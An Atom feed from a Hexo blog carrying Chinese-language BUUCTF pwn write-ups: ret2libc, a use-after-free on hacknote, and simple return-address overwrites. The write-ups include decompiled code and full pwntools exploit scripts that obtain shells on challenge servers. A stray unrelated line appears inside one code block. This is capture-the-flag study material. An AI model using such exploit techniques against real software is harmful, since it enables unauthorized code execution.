<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-03-23T15:33:23.973Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctf-xdctf2015_pwn200</title>
    <link href="http://example.com/2022/03/23/buuctf-xdctf2015-pwn200/"/>
    <id>http://example.com/2022/03/23/buuctf-xdctf2015-pwn200/</id>
    <published>2022-03-23T15:32:29.000Z</published>
    <updated>2022-03-23T15:33:23.973Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h1><p>查看保护:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/16/bof&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>我们直接看往伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+18h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);<span class="comment">//复制到buf里面Welcome to XDCTF2015~!</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);<span class="comment">//</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);<span class="comment">//然后计算出buf的长度</span></span><br><span class="line">  write(<span class="number">1</span>, buf, v3);<span class="comment">//v3是写入的字节数</span></span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我我当时盲猜应该就是溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出+覆盖ebp的字符=112</p><p>然后这个程序中没有system函数地址,就是泄漏libc地址,利用write_plt泄漏write_libc地址</p><p>正常操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=remote(&#x27;node4.buuoj.cn&#x27;,27250)</span><br><span class="line">p=process(&#x27;./bof&#x27;)</span><br><span class="line">elf=ELF(&#x27;./bof&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23-32.so&#x27;)</span><br><span class="line">write_plt=elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">main=0x0804851C</span><br><span class="line">p.recvuntil(&#x27;XDCTF2015~!&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*112+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print(&quot;write&quot;,hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc_addr=write_addr-libc.symbols[&#x27;write&#x27;]</span><br><span class="line">system=libc_addr+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_addr+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line">payload1=&#x27;a&#x27;*112+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">p.recvuntil(&#x27;XDCTF2015~!&#x27;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:<br>又是摸鱼的一天</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xdctf2015-pwn200&quot;&gt;&lt;a href=&quot;#xdctf2015-pwn200&quot; class=&quot;headerlink&quot; title=&quot;xdctf2015_pwn200&quot;&gt;&lt;/a&gt;xdctf2015_pwn200&lt;/h1&gt;&lt;p&gt;查看保护:&lt;/p&gt;
&lt;fig</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-jarvisoj_test_your_memory</title>
    <link href="http://example.com/2022/03/21/buuctf-jarvisoj-test-your-memory/"/>
    <id>http://example.com/2022/03/21/buuctf-jarvisoj-test-your-memory/</id>
    <published>2022-03-21T14:49:11.000Z</published>
    <updated>2022-03-21T14:50:04.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h1><p>这题是简单题就水一篇,最近状态有点不好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&#x27;./memory&#x27;)</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25036)</span><br><span class="line">elf=ELF(&#x27;./memory&#x27;)</span><br><span class="line">system=elf.symbols[&#x27;system&#x27;]</span><br><span class="line">cat_flag=0x80487e0</span><br><span class="line">payload=&#x27;a&#x27;*(0x13+4)+p32(system)+p32(0x08048677)+p32(cat_flag)</span><br><span class="line">#p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jarvisoj-test-your-memory&quot;&gt;&lt;a href=&quot;#jarvisoj-test-your-memory&quot; class=&quot;headerlink&quot; title=&quot;jarvisoj_test_your_memory&quot;&gt;&lt;/a&gt;jarvisoj_te</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-hitcontraining_uaf</title>
    <link href="http://example.com/2022/03/20/buuctf-hitcontraining-uaf/"/>
    <id>http://example.com/2022/03/20/buuctf-hitcontraining-uaf/</id>
    <published>2022-03-20T15:51:06.000Z</published>
    <updated>2022-03-20T15:51:39.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/10/hacknote&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found<span class="comment">//保护没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="comment">//保护没开</span></span></span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v3 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();<span class="comment">//free掉堆块</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();<span class="comment">//打印出堆块</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();<span class="comment">//创建堆块</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add_note()函数（创建堆块）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">5</span> )<span class="comment">//只能创建5个堆块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">int</span>)notelist[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);<span class="comment">//每次创建都会创建一个0x8的堆块</span></span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )<span class="comment">//判断是否存在</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *notelist[i] = print_note_content;<span class="comment">//应该是puts函数的地址,puts(a1+4)=参数+4</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);<span class="comment">//这个就是你输入的堆块大小</span></span><br><span class="line">      size = atoi(&amp;buf);</span><br><span class="line">      v1 = notelist[i];</span><br><span class="line">      v1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);<span class="comment">//然后创建堆的大小申请我们能决定的大小</span></span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="keyword">void</span> *)notelist[i][<span class="number">1</span>], size);<span class="comment">//向堆块写入我们的数据</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> count++ + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;此题为 【从<span class="number">0</span>开始学web】系列第三百八十题</span><br></pre></td></tr></table></figure><p>del_note()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);<span class="comment">//输入你要free掉的堆块index</span></span><br><span class="line">  v2 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = notelist[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)notelist[v2][<span class="number">1</span>]);<span class="comment">//他free掉的只有堆块，但是没有把指针清0,这样就产生了uaf漏洞</span></span><br><span class="line">    <span class="built_in">free</span>(notelist[v2]);</span><br><span class="line">    result = (_DWORD *)<span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/20/buuctf-hitcontraining-uaf/image-20220320232247790.png" alt="image-20220320232247790"></p><p>在申请的8的size的大小上的堆块上有puts函数所以我们可以将这里的<img src="/2022/03/20/buuctf-hitcontraining-uaf/image-20220320233236379.png" alt="image-20220320233236379"></p><p>还有system(/bin/sh)</p><p><img src="/2022/03/20/buuctf-hitcontraining-uaf/image-20220320233738587.png" alt="image-20220320233738587"></p><p>思路:</p><p>这个时候我们的思路是怎么样的?</p><p>申请两个堆块然后free掉,然后利用chunk的特性相同大小的chunk,会形成fastbins链表</p><p><img src="/2022/03/20/buuctf-hitcontraining-uaf/image-20220320234036219.png" alt="image-20220320234036219"></p><p>然后重新申请大小的chunk,在fastbins里有的话就从fastbins拿的特性</p><p>我们再申请一个0x8大小的堆,然后修改里面的puts函数的地址指向的是system(/bin/sh)函数的地址,然后再利用<code>uaf</code>printf打印你申请的那个堆就达到了getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28117</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./hacknote&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">shell_addr=<span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(shell_addr))</span><br><span class="line">printf(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hitcontraining-uaf&quot;&gt;&lt;a href=&quot;#hitcontraining-uaf&quot; class=&quot;headerlink&quot; title=&quot;hitcontraining_uaf&quot;&gt;&lt;/a&gt;hitcontraining_uaf&lt;/h1&gt;&lt;figure c</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-wustctf2020_getshell</title>
    <link href="http://example.com/2022/03/18/buuctf-wustctf2020-getshell/"/>
    <id>http://example.com/2022/03/18/buuctf-wustctf2020-getshell/</id>
    <published>2022-03-18T15:10:32.000Z</published>
    <updated>2022-03-18T15:11:10.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/9/wustctf2020_getshell&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>vulnerable()函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getshell函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804851B</span> shell           proc near</span><br><span class="line">.text:<span class="number">0804851B</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0804851B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804851</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804851</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048521</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048524</span>                 push    offset command  ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">08048529</span>                 call    _system</span><br><span class="line">.text:<span class="number">0804852</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048531</span>                 nop</span><br><span class="line">.text:<span class="number">08048532</span>                 leave</span><br><span class="line">.text:<span class="number">08048533</span>                 retn</span><br><span class="line">.text:<span class="number">08048533</span> ; &#125; <span class="comment">// starts at 804851B</span></span><br><span class="line">.text:<span class="number">08048533</span> shell           endp</span><br><span class="line">.text:<span class="number">08048533</span></span><br></pre></td></tr></table></figure><p>所以就是溢出覆盖到ebp+eip指向(0x0804851B)这个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./wustctf2020_getshell&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29302</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">28</span>+p32(<span class="number">0x0804851B</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;wustctf2020-getshell&quot;&gt;&lt;a href=&quot;#wustctf2020-getshell&quot; class=&quot;headerlink&quot; title=&quot;wustctf2020_getshell&quot;&gt;&lt;/a&gt;wustctf2020_getshell&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-PicoCTF_2018_rop_chain</title>
    <link href="http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/"/>
    <id>http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/</id>
    <published>2022-03-18T01:23:14.000Z</published>
    <updated>2022-03-18T01:24:18.364Z</updated>
    
